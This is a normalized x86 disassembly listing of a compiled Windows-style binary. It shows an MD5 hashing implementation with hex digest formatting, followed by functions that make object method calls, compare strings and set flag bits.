lea edx [ ecx + edx + 0x4787c62a ]
mov ecx [ eax + 0x18 ]
rol edx 0xc
add edx [ ebp + 0xc ]
mov [ ebp - 0x18 ] ecx
mov ecx edx
not ecx
mov [ ebp - 0x40 ] edi
and ecx esi
mov edi edx
and edi [ ebp + 0xc ]
or ecx edi
add ecx [ ebp - 0x18 ]
mov edi [ ebp - 0x4 ]
lea ecx [ ecx + edi - 0x57cfb9ed ]
ror ecx 0xf
add ecx edx
mov ebx ecx
not ebx
and ebx [ ebp + 0xc ]
mov edi edx
and edi ecx
or ebx edi
mov edi [ eax + 0x1c ]
add ebx edi
lea esi [ ebx + esi - 0x2b96aff ]
ror esi 0xa
add esi ecx
mov [ ebp - 0x3c ] edi
mov edi [ eax + 0x20 ]
mov [ ebp - 0x28 ] edi
mov edi esi
not edi
and edi edx
mov ebx ecx
and ebx esi
or edi ebx
add edi [ ebp - 0x28 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx + 0x698098d8 ]
mov [ ebp - 0xc ] esi
rol edi 0x7
add edi esi
and esi edi
mov ebx edi
not ebx
and ebx ecx
or ebx esi
mov esi [ eax + 0x24 ]
add ebx esi
mov [ ebp - 0x10 ] esi
mov esi [ eax + 0x28 ]
lea edx [ ebx + edx - 0x74bb0851 ]
mov [ ebp - 0x20 ] esi
rol edx 0xc
add edx edi
mov esi edx
not esi
and esi [ ebp - 0xc ]
mov ebx edx
and ebx edi
or esi ebx
add esi [ ebp - 0x20 ]
mov ebx edx
lea ecx [ esi + ecx - 0xa44f ]
mov esi [ eax + 0x2c ]
ror ecx 0xf
add ecx edx
mov [ ebp - 0x8 ] esi
and ebx ecx
mov esi ecx
not esi
and esi edi
or esi ebx
add esi [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
lea esi [ esi + ebx - 0x76a32842 ]
ror esi 0xa
add esi ecx
mov ebx esi
not ebx
mov [ ebp - 0x4 ] ecx
and ebx edx
and ecx esi
or ebx ecx
mov ecx [ eax + 0x30 ]
add ebx ecx
lea edi [ ebx + edi + 0x6b901122 ]
mov [ ebp - 0x44 ] ecx
rol edi 0x7
mov ecx [ eax + 0x34 ]
add edi esi
mov [ ebp + 0xc ] edi
not edi
and edi [ ebp - 0x4 ]
mov ebx esi
and ebx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
or edi ebx
add edi ecx
mov ecx [ eax + 0x38 ]
mov eax [ eax + 0x3c ]
lea edx [ edi + edx - 0x2678e6d ]
rol edx 0xc
add edx [ ebp + 0xc ]
mov [ ebp - 0x1c ] ecx
mov edi edx
not edi
mov ecx edi
and ecx esi
mov [ ebp - 0x14 ] eax
mov ebx edx
and ebx [ ebp + 0xc ]
or ecx ebx
add ecx [ ebp - 0x1c ]
mov ebx [ ebp - 0x4 ]
lea ecx [ ecx + ebx - 0x5986bc72 ]
ror ecx 0xf
add ecx edx
mov [ ebp - 0x4 ] ecx
not [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
and eax [ ebp + 0xc ]
mov ebx edx
and ebx ecx
or eax ebx
add eax [ ebp - 0x14 ]
and edi ecx
lea esi [ eax + esi + 0x49b40821 ]
ror esi 0xa
add esi ecx
mov eax edx
and eax esi
or edi eax
add edi [ ebp - 0x2c ]
mov eax [ ebp + 0xc ]
lea edi [ edi + eax - 0x9e1da9e ]
mov eax [ ebp - 0x4 ]
and eax esi
rol edi 0x5
add edi esi
mov ebx ecx
and ebx edi
or eax ebx
add eax [ ebp - 0x18 ]
lea edx [ eax + edx - 0x3fbf4cc0 ]
rol edx 0x9
add edx edi
mov eax esi
not eax
and eax edi
mov ebx edx
and ebx esi
or eax ebx
add eax [ ebp - 0x8 ]
lea ecx [ eax + ecx + 0x265e5a51 ]
rol ecx 0xe
add ecx edx
mov eax edi
not eax
and eax edx
mov ebx ecx
and ebx edi
or eax ebx
add eax [ ebp - 0x30 ]
lea esi [ eax + esi - 0x16493856 ]
ror esi 0xc
mov eax edx
not eax
add esi ecx
and eax ecx
mov ebx edx
and ebx esi
or eax ebx
add eax [ ebp - 0x40 ]
mov ebx ecx
lea edi [ eax + edi - 0x29d0efa3 ]
rol edi 0x5
add edi esi
and ebx edi
mov eax ecx
not eax
and eax esi
or eax ebx
add eax [ ebp - 0x20 ]
lea edx [ eax + edx + 0x2441453 ]
rol edx 0x9
add edx edi
mov eax esi
not eax
and eax edi
mov ebx edx
and ebx esi
or eax ebx
add eax [ ebp - 0x14 ]
lea ecx [ eax + ecx - 0x275e197f ]
rol ecx 0xe
add ecx edx
mov eax edi
not eax
and eax edx
mov ebx ecx
and ebx edi
or eax ebx
add eax [ ebp - 0x34 ]
mov ebx edx
lea esi [ eax + esi - 0x182c0438 ]
ror esi 0xc
add esi ecx
and ebx esi
mov eax edx
not eax
and eax ecx
or eax ebx
add eax [ ebp - 0x10 ]
mov ebx ecx
lea edi [ eax + edi + 0x21e1cde6 ]
rol edi 0x5
add edi esi
and ebx edi
mov eax ecx
not eax
and eax esi
or eax ebx
add eax [ ebp - 0x1c ]
lea edx [ eax + edx - 0x3cc8f82a ]
rol edx 0x9
add edx edi
mov eax esi
not eax
and eax edi
mov ebx edx
and ebx esi
or eax ebx
add eax [ ebp - 0x24 ]
lea ecx [ eax + ecx - 0xb2af279 ]
rol ecx 0xe
add ecx edx
mov eax edi
not eax
and eax edx
mov ebx ecx
and ebx edi
or eax ebx
add eax [ ebp - 0x28 ]
mov ebx edx
lea esi [ eax + esi + 0x455a14ed ]
ror esi 0xc
mov eax edx
not eax
add esi ecx
and eax ecx
and ebx esi
or eax ebx
add eax [ ebp - 0xc ]
mov ebx ecx
lea edi [ eax + edi - 0x561c16fb ]
rol edi 0x5
add edi esi
and ebx edi
mov eax ecx
not eax
and eax esi
or eax ebx
add eax [ ebp - 0x38 ]
lea edx [ eax + edx - 0x3105c08 ]
rol edx 0x9
add edx edi
mov eax esi
not eax
and eax edi
mov ebx edx
and ebx esi
or eax ebx
add eax [ ebp - 0x3c ]
lea ecx [ eax + ecx + 0x676f02d9 ]
rol ecx 0xe
add ecx edx
mov eax edi
not eax
and eax edx
mov ebx ecx
and ebx edi
or eax ebx
add eax [ ebp - 0x44 ]
lea esi [ eax + esi - 0x72d5b376 ]
ror esi 0xc
add esi ecx
mov eax edx
xor eax ecx
xor eax esi
add eax [ ebp - 0x40 ]
lea edi [ eax + edi - 0x5c6be ]
rol edi 0x4
add edi esi
mov eax ecx
xor eax esi
xor eax edi
add eax [ ebp - 0x28 ]
lea edx [ eax + edx - 0x788e097f ]
rol edx 0xb
add edx edi
mov eax edx
xor eax esi
xor eax edi
add eax [ ebp - 0x8 ]
lea ecx [ eax + ecx + 0x6d9d6122 ]
rol ecx 0x10
add ecx edx
mov eax edx
xor eax ecx
mov ebx eax
xor ebx edi
add ebx [ ebp - 0x1c ]
lea esi [ ebx + esi - 0x21ac7f4 ]
ror esi 0x9
add esi ecx
xor eax esi
add eax [ ebp - 0x2c ]
lea edi [ eax + edi - 0x5b4115bc ]
rol edi 0x4
add edi esi
mov eax ecx
xor eax esi
xor eax edi
add eax [ ebp - 0x34 ]
lea edx [ eax + edx + 0x4bdecfa9 ]
rol edx 0xb
add edx edi
mov eax edx
xor eax esi
xor eax edi
add eax [ ebp - 0x3c ]
lea ebx [ eax + ecx - 0x944b4a0 ]
rol ebx 0x10
add ebx edx
mov ecx edx
xor ecx ebx
mov eax ecx
xor eax edi
add eax [ ebp - 0x20 ]
lea eax [ eax + esi - 0x41404390 ]
ror eax 0x9
add eax ebx
xor ecx eax
add ecx [ ebp - 0xc ]
mov esi ebx
lea ecx [ ecx + edi + 0x289b7ec6 ]
xor esi eax
rol ecx 0x4
add ecx eax
xor esi ecx
add esi [ ebp - 0x30 ]
lea edx [ esi + edx - 0x155ed806 ]
rol edx 0xb
add edx ecx
mov esi edx
xor esi eax
xor esi ecx
add esi [ ebp - 0x24 ]
mov edi edx
lea esi [ esi + ebx - 0x2b10cf7b ]
rol esi 0x10
add esi edx
xor edi esi
mov ebx edi
xor ebx ecx
add ebx [ ebp - 0x18 ]
lea eax [ ebx + eax + 0x4881d05 ]
ror eax 0x9
add eax esi
xor edi eax
add edi [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x262b2fc7 ]
rol ecx 0x4
add ecx eax
mov edi esi
xor edi eax
xor edi ecx
add edi [ ebp - 0x44 ]
lea edx [ edi + edx - 0x1924661b ]
rol edx 0xb
add edx ecx
mov edi edx
xor edi eax
xor edi ecx
add edi [ ebp - 0x14 ]
lea esi [ edi + esi + 0x1fa27cf8 ]
rol esi 0x10
add esi edx
mov edi edx
xor edi esi
xor edi ecx
add edi [ ebp - 0x38 ]
lea eax [ edi + eax - 0x3b53a99b ]
ror eax 0x9
add eax esi
mov edi edx
not edi
or edi eax
xor edi esi
add edi [ ebp - 0x30 ]
lea ecx [ edi + ecx - 0xbd6ddbc ]
rol ecx 0x6
add ecx eax
mov edi esi
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x3c ]
lea edx [ edi + edx + 0x432aff97 ]
rol edx 0xa
add edx ecx
mov edi eax
not edi
or edi edx
xor edi ecx
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x546bdc59 ]
rol esi 0xf
add esi edx
mov edi ecx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x40 ]
lea eax [ edi + eax - 0x36c5fc7 ]
ror eax 0xb
add eax esi
mov edi edx
not edi
or edi eax
xor edi esi
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx + 0x655b59c3 ]
rol ecx 0x6
add ecx eax
mov edi esi
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x24 ]
lea edx [ edi + edx - 0x70f3336e ]
rol edx 0xa
add edx ecx
mov edi eax
not edi
or edi edx
xor edi ecx
add edi [ ebp - 0x20 ]
lea esi [ edi + esi - 0x100b83 ]
rol esi 0xf
add esi edx
mov edi ecx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0x2c ]
lea eax [ edi + eax - 0x7a7ba22f ]
ror eax 0xb
add eax esi
mov edi edx
not edi
or edi eax
xor edi esi
add edi [ ebp - 0x28 ]
lea ecx [ edi + ecx + 0x6fa87e4f ]
rol ecx 0x6
add ecx eax
mov edi esi
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x14 ]
lea edx [ edi + edx - 0x1d31920 ]
rol edx 0xa
add edx ecx
mov edi eax
not edi
or edi edx
xor edi ecx
add edi [ ebp - 0x18 ]
lea esi [ edi + esi - 0x5cfebcec ]
rol esi 0xf
add esi edx
mov edi ecx
not edi
or edi esi
xor edi edx
add edi [ ebp - 0xc ]
lea eax [ edi + eax + 0x4e0811a1 ]
ror eax 0xb
mov edi edx
add eax esi
not edi
or edi eax
xor edi esi
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx - 0x8ac817e ]
rol ecx 0x6
add ecx eax
mov edi esi
not edi
or edi ecx
xor edi eax
add edi [ ebp - 0x8 ]
lea edx [ edi + edx - 0x42c50dcb ]
rol edx 0xa
add edx ecx
mov edi eax
not edi
or edi edx
xor edi ecx
add edi [ ebp - 0x38 ]
lea esi [ edi + esi + 0x2ad7d2bb ]
mov edi ecx
not edi
rol esi 0xf
add esi edx
or edi esi
xor edi edx
add edi [ ebp - 0x10 ]
lea edi [ edi + eax - 0x14792c6f ]
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0xc ]
add ebx ecx
mov ecx [ eax + 0x14 ]
ror edi 0xb
add edi [ eax + 0x10 ]
add ecx esi
add edi esi
mov [ eax + 0x14 ] ecx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x10 ] edi
pop edi
add ecx edx
pop esi
mov [ eax + 0xc ] ebx
mov [ eax + 0x18 ] ecx
pop ebx
leave
retn 0x8
push 0x10
mov esi eax
pop ecx
lea edi [ ebp - 0x84 ]
[ edi ] [ esi ]
lea eax [ ebp - 0x84 ]
sub_415b4f
cmp [ ecx + 0x18 ] 0x10
mov eax [ ecx + 0x14 ]
jb r-xdata
lea edx [ ecx + 0x4 ]
mov edx [ ecx + 0x4 ]
jmp r-xdata
retn 0x4
push eax
mov ecx eax
push edx
mov edx [ esp + 0xc ]
shl ecx 0x3
call sub_415b77
test eax eax
jle r-xdata
sub_415b77
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x4 ]
push edi
mov edi eax
mov edx ebx
sar edx 0x1d
add [ esi + 0x8 ] edx
mov edx [ esi + 0x8 ]
shr edi 0x3
add eax ecx
and edi 0x3f
mov [ esi + 0x4 ] eax
cmp eax ecx
jae r-xdata
test edi edi
je r-xdata
inc edx
mov [ esi + 0x8 ] edx
mov edi [ ebp + 0xc ]
cmp edi 0x40
jl r-xdata
lea eax [ edi + ebx ]
cmp eax 0x40
jle r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
shr edi 0x6
mov eax edi
imul eax eax 0xffffffc0
add [ ebp + 0xc ] eax
push ebx
push [ ebp + 0x8 ]
lea eax [ edi + esi + 0x1c ]
push eax
call sub_4285a0
lea eax [ ebx + edi ]
add esp 0xc
cmp eax 0x40
jl r-xdata
push 0x40
pop ebx
sub ebx edi
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp + 0xc ]
add esi 0x1c
push [ ebp - 0x4 ]
push esi
call sub_4285a0
add esp 0xc
push [ ebp - 0x4 ]
push esi
call sub_415424
add [ ebp - 0x4 ] 0x40
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp + 0xc ] ebx
add eax ebx
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1c ]
push eax
push esi
call sub_415424
sub_415c2c
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x5c ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
xor eax eax
mov edx eax
sar edx 0x2
mov edx [ esi + edx * 4 + 0x4 ]
mov ecx eax
and ecx 0x3
shl ecx 0x3
shr edx cl
inc eax
cmp eax 0x8
mov [ ebp + eax - 0xd ] dl
jl r-xdata
mov ecx [ esi + 0x4 ]
shr ecx 0x3
push 0xfffffff7
pop eax
sub eax ecx
and eax 0x3f
inc eax
test eax eax
jle r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x40
pop ecx
push 0x8
pop eax
mov edx esi
call sub_415b77
mov [ esi + 0x5c ] 0x1
mov ecx eax
push eax
shl ecx 0x3
push r--data
mov edx esi
call sub_415b77
sub_415ca9
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
push ebx
push esi
mov esi ecx
cmp [ esi + 0x5c ] 0x0
push edi
mov [ ebp - 0x2c ] eax
jne r-xdata
xor edi edi
lea ebx [ ebp - 0x28 ]
call sub_415c2c
mov eax edi
sar eax 0x2
mov eax [ esi + eax * 4 + 0xc ]
mov ecx edi
and ecx 0x3
shl ecx 0x3
shr eax cl
movzx eax al
push eax
push r--data
push ebx
call sub_42354a
add esp 0xc
inc edi
inc ebx
inc ebx
cmp edi 0x10
jl r-xdata
mov ecx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
push eax
call sub_403dc1
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x2c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4234de
leave
retn 0x4
sub_415d25
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x18 ] 0x0
push esi
mov esi ecx
cmp [ esi + 0x5c ] 0x0
jne r-xdata
xor eax eax
call sub_415c2c
mov edx eax
sar edx 0x2
mov edx [ esi + edx * 4 + 0xc ]
mov ecx eax
and ecx 0x3
shl ecx 0x3
shr edx cl
inc eax
cmp eax 0x10
mov [ ebp + eax - 0x15 ] dl
jl r-xdata
push 0x10
lea eax [ ebp - 0x14 ]
push eax
mov esi edi
call sub_409c3d
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax edi
pop esi
call sub_4234de
leave
retn
sub_415dbb
push ebp
sub esp 0x58
push 0x70
mov eax sub_43af50
call sub_425dad
mov esi ecx
mov [ ebp + 0x58 ] esi
xor ebx ebx
cmp [ esi + 0x34 ] bl
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x5c
leave
retn 0x4
mov edi [ ebp + 0x64 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x68 ]
cmp eax 0x2000
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] ebx
call sub_403dc1
push rw-data
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x48 ]
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
mov [ ebp + 0x54 ] eax
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
cmp [ ebp + 0x54 ] ebx
je r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x94 ]
cmp eax 0x3
jne r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_403dc1
lea ecx [ ebp - 0x60 ]
push ecx
lea ecx [ ebp - 0x7c ]
mov [ ebp - 0x4 ] 0x1e
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x88 ]
cmp [ eax + 0x14 ] ebx
push ebx
push 0x1
lea ecx [ ebp - 0x7c ]
sete [ ebp + 0x67 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x60 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
cmp [ esi + 0x8 ] ebx
je r-xdata
mov [ esi + 0x34 ] 0x1
jmp r-xdata
push r--data
lea ecx [ esi + 0xc ]
mov [ esi + 0x28 ] ebx
call sub_40409c
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x2
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x88 ]
cmp [ eax + 0x14 ] ebx
push ebx
push 0x1
lea ecx [ ebp ]
sete [ ebp + 0x67 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
lea ecx [ ebp ]
cmp [ ebp + 0x67 ] bl
je r-xdata
push r--data
call sub_403dc1
lea ecx [ ebp ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xf
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x40 ]
push 0xffffffff
push ebx
push eax
lea ecx [ esi + 0xc ]
mov [ ebp - 0x4 ] 0x10
call sub_40400a
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
push r--data
lea ecx [ ebp ]
mov [ esi + 0x28 ] ebx
call sub_403dc1
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x11
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x4c ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp ]
mov edi eax
call sub_40415f
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x12
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x13
call sub_403dc1
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x14
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
mov esi r--data
push esi
call sub_403dc1
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x3
call sub_403dc1
push r--data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x4
call sub_403dc1
mov ecx [ ebp + 0x54 ]
lea edx [ ebp ]
push edx
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ ecx ]
push edx
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
push esi
lea ecx [ ebp - 0x28 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x15
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x16
call sub_403dc1
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x17
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
mov eax [ ebp + 0x58 ]
or [ eax + 0x28 ] 0x1
push esi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0x7
call sub_403dc1
mov ecx [ ebp + 0x54 ]
lea edx [ ebp + 0x38 ]
push edx
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0x8
mov eax [ ecx ]
push edx
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
push 0x1
push esi
lea ecx [ ebp - 0x28 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x18
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x19
call sub_403dc1
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x1a
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
mov eax [ ebp + 0x58 ]
or [ eax + 0x28 ] 0x2
push esi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
mov ecx [ ebp + 0x54 ]
lea edx [ ebp + 0x38 ]
push edx
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0xb
mov eax [ ecx ]
push edx
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
push 0x2
jmp r-xdata
mov ebx [ ebp + 0x58 ]
mov eax [ ebx + 0x8 ]
mov esi [ eax ]
mov eax [ edi ]
call [ eax + 0x6c ]
mov ecx [ ebx + 0x8 ]
push eax
jmp r-xdata
push esi
lea ecx [ ebp - 0x28 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x1b
call sub_403dc1
push r--data
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x1c
call sub_403dc1
lea ecx [ ebp - 0x28 ]
push ecx
lea ecx [ ebp + 0x38 ]
push ecx
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0x1d
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
cmp [ ebp + 0x67 ] bl
je r-xdata
mov eax [ ebp + 0x58 ]
or [ eax + 0x28 ] 0x4
push esi
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push esi
lea ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] 0xc
call sub_403dc1
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] 0xd
call sub_403dc1
mov ecx [ ebp + 0x54 ]
lea edx [ ebp + 0x38 ]
push edx
lea edx [ ebp + 0x1c ]
push edx
lea edx [ ebp ]
mov [ ebp - 0x4 ] 0xe
mov eax [ ecx ]
push edx
call [ eax + 0x50 ]
push ebx
push 0x1
lea ecx [ ebp ]
mov [ ebp + 0x67 ] al
call sub_40415f
push ebx
push 0x1
lea ecx [ ebp + 0x1c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
mov ecx edi
cmp [ ebp + 0x67 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov ecx edi
jmp r-xdata
call [ esi + 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x58 ]
or [ eax + 0x28 ] 0x8
jmp r-xdata
mov eax [ ebp + 0x58 ]
mov eax [ eax + 0x8 ]
mov esi [ eax ]
mov eax [ edi ]
push ebx
call [ eax + 0x6c ]
push eax
mov eax [ ebp + 0x58 ]
mov ecx [ eax + 0x8 ]
push 0x8
sub_41638a
push ebp
sub esp 0x5c
push 0x54
mov eax sub_43bfdb
call sub_425dad
mov [ ebp + 0x58 ] ecx
xor ebx ebx
mov [ ebp + 0x5c ] ebx
cmp [ ecx + 0x34 ] bl
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
add ebp 0x60
leave
retn 0x4
cmp [ ecx + 0x2c ] ebx
je r-xdata
mov [ ecx + 0x30 ] ebx
push 0x80
call sub_4246c6
pop ecx
mov [ ebp + 0x54 ] eax
mov [ ebp - 0x4 ] ebx
mov esi r--data
cmp eax ebx
je r-xdata
xor edi edi
push esi
lea ecx [ ebp ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x1
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp + 0x5c ] 0x1
call sub_403dc1
lea eax [ ebp ]
push eax
lea eax [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
mov edi [ ebp + 0x68 ]
push eax
push [ ebp + 0x54 ]
xor bl bl
mov [ ebp + 0x5c ] 0x3
call sub_41ed6b
mov edi eax
xor ebx ebx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x5c ] 0x1
je r-xdata
and [ ebp + 0x5c ] 0xfffffffd
push ebx
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_40415f
test [ ebp + 0x5c ] 0x2
je r-xdata
push r--data
lea ecx [ ebp + 0x38 ]
call sub_403dc1
push rw-data
lea ecx [ ebp + 0x38 ]
mov [ ebp - 0x4 ] 0x5
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp + 0x38 ]
call sub_40415f
mov eax [ ebp + 0x58 ]
test [ eax + 0x2c ] 0x1
je r-xdata
and [ ebp + 0x5c ] 0xfffffffe
push ebx
push 0x1
lea ecx [ ebp ]
call sub_40415f
mov eax [ ebp + 0x58 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0x80
call sub_4246c6
pop ecx
